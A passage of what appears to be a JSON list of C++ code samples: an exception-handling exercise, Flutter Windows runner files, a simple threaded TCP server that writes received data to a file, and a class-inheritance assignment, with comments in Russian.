\u0441\u0438\u0442\u0443\u0430\u0446\u0438\u0438 \u043d\u0435 \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u0442\u0441\u044f\n\t//\tc = a / b;\n\t//}\n\t//// \u0411\u043b\u043e\u043a, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043b\u043e\u0432\u0438\u0442 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435\n\t//catch (int ex) {\n\t//\tif (ex == -1) {\n\t//\t\tprintf(\"devide by 0\\n\");\n\t//\t}\n\t//}\n\t//// \u041b\u044e\u0431\u044b\u0435 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043a\u0438\u0434\u0430\u044e\u0442\u0441\u044f \u0438\u0437\u043d\u0443\u0442\u0440\u0438 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b, \u0435\u0441\u043b\u0438 \u043e\u043d\u0438 \u043d\u0435 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u044b cathc-\u0431\u043b\u043e\u043a\u0430\u043c\u0438\n\t//catch (...) { \n\t//\tprintf(\"Something go wrong\\n\");\n\t//}\n\n\t::srand(::time(NULL));\n\ttry {\n\t\tint i{};\n\t\ti = rand() % 2;\n\t\t//F00(i);\n\t\tSumm(2e30, 4e31);\n\t}\n\tcatch (std::exception& ex) {\n\t\tstd::cerr << ex.what() << '\\n'; // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0432\u044b\u0432\u043e\u0434\u0430 \u0441\u043e\u043f\u0440\u043e\u0432\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0433\u043e \u0442\u0435\u043a\u0441\u0442\u0430, \u043d\u0430\u0445\u043e\u0434\u044f\u0449\u0435\u0433\u043e\u0441\u044f \u0432 \u043a\u043b\u0430\u0441\u0441\u0430 \u043e\u0448\u0438\u0431\u043a\u0438\n\t}\n\t// \u0423\u043d\u0438\u0432\u0435\u0440\u0441\u0430\u043b\u044c\u043d\u044b\u0439 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439 \u043f\u0438\u0448\u0435\u043c \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0438\u043c \u0434\u043b\u044f \u043e\u0442\u043e\u043b\u043e\u0432\u0430 \u0442\u043e\u0433\u043e, \u0447\u0442\u043e \u043d\u0435 \u043f\u043e\u0439\u043c\u0430\u043b\u0438 \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0438\u0435 catch\n\tcatch (...) { \n\t\tprintf(\"Something go wrong\\n\");\n\t}\n\n\treturn 0;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <cstring>\r\n#include <cerrno>\r\n#include <unistd.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <arpa/inet.h>\r\n#include <pthread.h>\r\n\r\nconstexpr int MAX_THREADS = 10; // \u041c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u043e\u0442\u043e\u043a\u043e\u0432\r\nconstexpr int MAX_BUFFER_SIZE = 1024; // \u041c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u044b\u0439 \u0440\u0430\u0437\u043c\u0435\u0440 \u0431\u0443\u0444\u0435\u0440\u0430 \u0434\u043b\u044f \u0434\u0430\u043d\u043d\u044b\u0445\r\n\r\n// \u0421\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430 \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0438 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u043e\u0432 \u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \u043f\u043e\u0442\u043e\u043a\u0430\r\nstruct ThreadArgs {\r\n    int clientSocket; // \u0421\u043e\u043a\u0435\u0442 \u043a\u043b\u0438\u0435\u043d\u0442\u0430\r\n    const char* savePath; // \u041f\u0443\u0442\u044c \u0434\u043b\u044f \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0434\u0430\u043d\u043d\u044b\u0445\r\n};\r\n\r\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0438 \u043a\u043b\u0438\u0435\u043d\u0442\u0430 \u0432 \u043e\u0442\u0434\u0435\u043b\u044c\u043d\u043e\u043c \u043f\u043e\u0442\u043e\u043a\u0435\r\nvoid* handleClient(void* arg) {\r\n    ThreadArgs* threadArgs = reinterpret_cast<ThreadArgs*>(arg); // \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u043e\u0432\r\n\r\n    char buffer[MAX_BUFFER_SIZE]; // \u0411\u0443\u0444\u0435\u0440 \u0434\u043b\u044f \u0434\u0430\u043d\u043d\u044b\u0445\r\n    ssize_t bytesReceived; // \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u0440\u0438\u043d\u044f\u0442\u044b\u0445 \u0431\u0430\u0439\u0442\r\n\r\n    // \u041f\u0440\u0438\u0435\u043c \u0434\u0430\u043d\u043d\u044b\u0445 \u043e\u0442 \u043a\u043b\u0438\u0435\u043d\u0442\u0430\r\n    bytesReceived = recv(threadArgs->clientSocket, buffer, MAX_BUFFER_SIZE, 0);\r\n    if (bytesReceived < 0) { // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u043e\u0448\u0438\u0431\u043a\u0443 \u043f\u0440\u0438\u0435\u043c\u0430\r\n        perror(\"Error in recv\");\r\n        close(threadArgs->clientSocket);\r\n        delete threadArgs;\r\n        pthread_exit(NULL);\r\n    }\r\n\r\n    // \u0421\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u0438\u043d\u044f\u0442\u044b\u0445 \u0434\u0430\u043d\u043d\u044b\u0445 \u0432 \u0444\u0430\u0439\u043b\r\n    FILE* file = fopen(threadArgs->savePath, \"w\");\r\n    if (file == nullptr) { // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u043e\u0448\u0438\u0431\u043a\u0443 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u0444\u0430\u0439\u043b\u0430\r\n        perror(\"Error opening file\");\r\n        close(threadArgs->clientSocket);\r\n        delete threadArgs;\r\n        pthread_exit(NULL);\r\n    }\r\n    size_t bytesWritten = fwrite(buffer, 1, bytesReceived, file); // \u0417\u0430\u043f\u0438\u0441\u044c \u0434\u0430\u043d\u043d\u044b\u0445 \u0432 \u0444\u0430\u0439\u043b\r\n    if (bytesWritten != static_cast<size_t>(bytesReceived)) { // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u043e\u0448\u0438\u0431\u043a\u0443 \u0437\u0430\u043f\u0438\u0441\u0438\r\n        perror(\"Error writing to file\");\r\n        fclose(file);\r\n        close(threadArgs->clientSocket);\r\n        delete threadArgs;\r\n        pthread_exit(NULL);\r\n    }\r\n    fclose(file); // \u0417\u0430\u043a\u0440\u044b\u0442\u0438\u0435 \u0444\u0430\u0439\u043b\u0430\r\n\r\n    // \u0412\u044b\u0432\u043e\u0434 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f \u043e\u0431 \u0443\u0441\u043f\u0435\u0448\u043d\u043e\u0439 \u0437\u0430\u043f\u0438\u0441\u0438 \u0444\u0430\u0439\u043b\u0430\r\n    if (bytesWritten > 0) {\r\n        std::cout << \"File successfully written: \" << threadArgs->savePath << std::endl;\r\n    } else {\r\n        std::cout << \"Failed to write file: \" << threadArgs->savePath << std::endl;\r\n    }\r\n\r\n    close(threadArgs->clientSocket); // \u0417\u0430\u043a\u0440\u044b\u0442\u0438\u0435 \u0441\u043e\u043a\u0435\u0442\u0430 \u043a\u043b\u0438\u0435\u043d\u0442\u0430\r\n    delete threadArgs; // \u041e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u043f\u0430\u043c\u044f\u0442\u0438 \u0434\u043b\u044f \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u043e\u0432\r\n    pthread_exit(NULL); // \u0412\u044b\u0445\u043e\u0434 \u0438\u0437 \u043f\u043e\u0442\u043e\u043a\u0430\r\n}\r\n\r\nint main(int argc, char *argv[]) {\r\n    // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u043e\u0432 \u043a\u043e\u043c\u0430\u043d\u0434\u043d\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0438\r\n    if (argc != 4) {\r\n        std::cerr << \"Usage: \" << argv[0] << \" <port> <save_path> <max_threads>\\n\";\r\n        return EXIT_FAILURE;\r\n    }\r\n\r\n    // \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0438\u0437 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u043e\u0432 \u043a\u043e\u043c\u0430\u043d\u0434\u043d\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0438\r\n    int port = atoi(argv[1]); // \u041f\u043e\u0440\u0442\r\n    const char* savePath = argv[2]; // \u041f\u0443\u0442\u044c \u0434\u043b\u044f \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0434\u0430\u043d\u043d\u044b\u0445\r\n    int maxThreads = atoi(argv[3]); // \u041c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u043e\u0442\u043e\u043a\u043e\u0432\r\n\r\n    int serverSocket, clientSocket; // \u0421\u0435\u0440\u0432\u0435\u0440\u043d\u044b\u0439 \u0438 \u043a\u043b\u0438\u0435\u043d\u0442\u0441\u043a\u0438\u0439 \u0441\u043e\u043a\u0435\u0442\u044b\r\n    struct sockaddr_in serverAddr, clientAddr; // \u0421\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u044b \u0430\u0434\u0440\u0435\u0441\u043e\u0432 \u0441\u0435\u0440\u0432\u0435\u0440\u0430 \u0438 \u043a\u043b\u0438\u0435\u043d\u0442\u0430\r\n    socklen_t clientLen = sizeof(clientAddr); // \u0420\u0430\u0437\u043c\u0435\u0440 \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u044b \u043a\u043b\u0438\u0435\u043d\u0442\u0430\r\n\r\n    // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0441\u043e\u043a\u0435\u0442\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0430\r\n    serverSocket = socket(AF_INET, SOCK_STREAM, 0);\r\n    if (serverSocket < 0) { // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u043e\u0448\u0438\u0431\u043a\u0443 \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0441\u043e\u043a\u0435\u0442\u0430\r\n        perror(\"Error creating socket\");\r\n        return EXIT_FAILURE;\r\n    }\r\n\r\n    // \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0430 \u0430\u0434\u0440\u0435\u0441\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0430\r\n    serverAddr.sin_family = AF_INET;\r\n    serverAddr.sin_addr.s_addr = INADDR_ANY;\r\n    serverAddr.sin_port = htons(port);\r\n\r\n    // \u041f\u0440\u0438\u0432\u044f\u0437\u043a\u0430 \u0441\u043e\u043a\u0435\u0442\u0430 \u043a \u0430\u0434\u0440\u0435\u0441\u0443\r\n    if (bind(serverSocket, reinterpret_cast<struct sockaddr*>(&serverAddr), sizeof(serverAddr)) < 0) {\r\n        perror(\"Error binding socket\");\r\n        close(serverSocket);\r\n        return EXIT_FAILURE;\r\n    }\r\n\r\n    // \u041f\u0440\u043e\u0441\u043b\u0443\u0448\u0438\u0432\u0430\u043d\u0438\u0435 \u0441\u043e\u043a\u0435\u0442\u0430\r\n    listen(serverSocket, 5);\r\n\r\n    pthread_t threads[MAX_THREADS]; // \u041c\u0430\u0441\u0441\u0438\u0432 \u043f\u043e\u0442\u043e\u043a\u043e\u0432\r\n    int threadCount = 0; // \u0421\u0447\u0435\u0442\u0447\u0438\u043a \u043f\u043e\u0442\u043e\u043a\u043e\u0432\r\n\r\n    // \u0411\u0435\u0441\u043a\u043e\u043d\u0435\u0447\u043d\u044b\u0439 \u0446\u0438\u043a\u043b \u043f\u0440\u0438\u043d\u044f\u0442\u0438\u044f \u043a\u043b\u0438\u0435\u043d\u0442\u043e\u0432\r\n    while (true) {\r\n        // \u041f\u0440\u0438\u043d\u044f\u0442\u0438\u0435 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f \u043e\u0442 \u043a\u043b\u0438\u0435\u043d\u0442\u0430\r\n        clientSocket = accept(serverSocket, reinterpret_cast<struct sockaddr*>(&clientAddr), &clientLen);\r\n                // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u043e\u0448\u0438\u0431\u043a\u0443 \u043f\u0440\u0438\u043d\u044f\u0442\u0438\u044f \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f\r\n        if (clientSocket < 0) {\r\n            perror(\"Error accepting connection\");\r\n            continue; // \u041f\u0440\u043e\u0434\u043e\u043b\u0436\u0435\u043d\u0438\u0435 \u0446\u0438\u043a\u043b\u0430 \u0434\u043b\u044f \u043e\u0436\u0438\u0434\u0430\u043d\u0438\u044f \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u0433\u043e \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f\r\n        }\r\n\r\n        // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u044b \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u043e\u0432 \u0434\u043b\u044f \u043f\u043e\u0442\u043e\u043a\u0430\r\n        ThreadArgs* args = new ThreadArgs;\r\n        args->clientSocket = clientSocket; // \u041f\u0435\u0440\u0435\u0434\u0430\u0447\u0430 \u043a\u043b\u0438\u0435\u043d\u0442\u0441\u043a\u043e\u0433\u043e \u0441\u043e\u043a\u0435\u0442\u0430\r\n        args->savePath = savePath; // \u041f\u0435\u0440\u0435\u0434\u0430\u0447\u0430 \u043f\u0443\u0442\u0438 \u0434\u043b\u044f \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0434\u0430\u043d\u043d\u044b\u0445\r\n\r\n        // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043d\u043e\u0432\u043e\u0433\u043e \u043f\u043e\u0442\u043e\u043a\u0430 \u0434\u043b\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0438 \u043a\u043b\u0438\u0435\u043d\u0442\u0430\r\n        pthread_create(&threads[threadCount++ % maxThreads], NULL, handleClient, args);\r\n    }\r\n\r\n    close(serverSocket); // \u0417\u0430\u043a\u0440\u044b\u0442\u0438\u0435 \u0441\u0435\u0440\u0432\u0435\u0440\u043d\u043e\u0433\u043e \u0441\u043e\u043a\u0435\u0442\u0430\r\n    return EXIT_SUCCESS; // \u0412\u044b\u0445\u043e\u0434 \u0441 \u0443\u0441\u043f\u0435\u0445\u043e\u043c\r\n}\r\n",
    "/*\u0412\u0430\u0440\u0438\u0430\u043d\u0442 \u2116 3\n\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0431\u0430\u0437\u043e\u0432\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 \u00ab\u043a\u0432\u0430\u0434\u0440\u0430\u0442\u00bb. \u042d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u043a\u043b\u0430\u0441\u0441\u0430: \u043f\u043e\u043b\u0435, \u0437\u0430\u0434\u0430\u044e\u0449\u0435\u0435 \u0434\u043b\u0438\u043d\u0443 \u0441\u0442\u043e\u0440\u043e\u043d\u044b (\u0441\u0442\u0430\u0442\u0443\u0441 \u0434\u043e\u0441\u0442\u0443\u043f\u0430 protected);\n\u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u043f\u043e\u043b\u044f; \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u044f \u043f\u043b\u043e\u0449\u0430\u0434\u0438 \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u0430; \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u0435\u0447\u0430\u0442\u0438 \u043f\u043e\u043b\u044f \u0438 \u043f\u043b\u043e\u0449\u0430\u0434\u0438 \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u0430.\n\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u043d\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 \u00ab\u043a\u0443\u0431\u00bb. \u042d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u043a\u043b\u0430\u0441\u0441\u0430: \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u043f\u043e\u043b\u044f;\n\u043f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u0430\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u0435\u043c\u0430 \u043a\u0443\u0431\u0430 (\u0432\u043c\u0435\u0441\u0442\u043e \u043f\u043b\u043e\u0449\u0430\u0434\u0438) (\u0432\u043d\u0443\u0442\u0440\u0438 \u043f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u043e\u0439 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0434\u043e\u043b\u0436\u043d\u0430 \u0432\u044b\u0437\u044b\u0432\u0430\u0442\u044c\u0441\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0438\u0437 \u0431\u0430\u0437\u043e\u0432\u043e\u0433\u043e \u043a\u043b\u0430\u0441\u0441\u0430).\n\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u043f\u043e 1 \u043e\u0431\u044a\u0435\u043a\u0442\u0443 \u043a\u0430\u0436\u0434\u043e\u0433\u043e \u0438\u0437 \u043a\u043b\u0430\u0441\u0441\u043e\u0432. \u041f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0432\u044b\u0437\u043e\u0432 \u0441\u043e\u0437\u0434\u0430\u043d\u043d\u044b\u0445 \u0444\u0443\u043d\u043a\u0446\u0438\u0439.\n\u041f\u0440\u0438 \u043f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0438 \u0444\u0443\u043d\u043a\u0446\u0438\u0439 \u043e\u0431\u0435\u0441\u043f\u0435\u0447\u0438\u0442\u044c \u0438 \u043f\u0440\u043e\u0434\u0435\u043c\u043e\u043d\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0434\u0432\u0430 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u0430: \u0441\u0442\u0430\u0442\u0438\u0447\u0435\u0441\u043a\u0438\u0439 \u043f\u043e\u043b\u0438\u043c\u043e\u0440\u0444\u0438\u0437\u043c \u0438 \u0434\u0438\u043d\u0430\u043c\u0438\u0447\u0435\u0441\u043a\u0438\u0439 \u043f\u043e\u043b\u0438\u043c\u043e\u0440\u0444\u0438\u0437\u043c.*/\n\n#include <stdlib.h>\n#include <iostream>\nusing namespace std;\nclass Square // \u0411\u0430\u0437\u043e\u0432\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 - \"\u041a\u0432\u0430\u0434\u0440\u0430\u0442\"\n{\nprotected:\n    double l; // \u0414\u043b\u0438\u043d\u0430 \u0441\u0442\u043e\u0440\u043e\u043d\u044b\npublic:\n    Square(double l): l(l) {}  // \u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u043f\u043e\u043b\u044f\n\n    virtual double area() {\n        return l*l;\n    }\n    void print() {\n        cout << \"\\nSide = \" << l << \" Area = \" << l*l << \"\\n\";\n    }\n};\nclass Cube: public Square // \u041f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u043d\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 - \"\u041a\u0443\u0431\"\n{\npublic:\n    Cube(double l): Square(l) {} // \u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\n\n    double area() override // \u041f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434 area\n    {\n        return Square::area()*l;\n    }\n};\n\nint main(int argc, char* argv[])\n{\n    Square sq_static(12);\n    cout << sq_static.area() << \"\\n\";\n    Cube c_static(4);\n    cout << c_static.area() << \"\\n\";\n\n    Square* sq_dinamic = new Square(10);\n    cout << sq_dinamic->area() << \"\\n\";\n    Cube* c_dinamic = new Cube(7);\n    cout << c_dinamic->area() << \"\\n\";\n    system(\"pause\"); // \u041e\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0443 \u0434\u043e \u043d\u0430\u0436\u0430\u0442\u0438\u044f \u043b\u044e\u0431\u043e\u0439 \u043a\u043b\u0430\u0432\u0438\u0448\u0438\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"dice\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
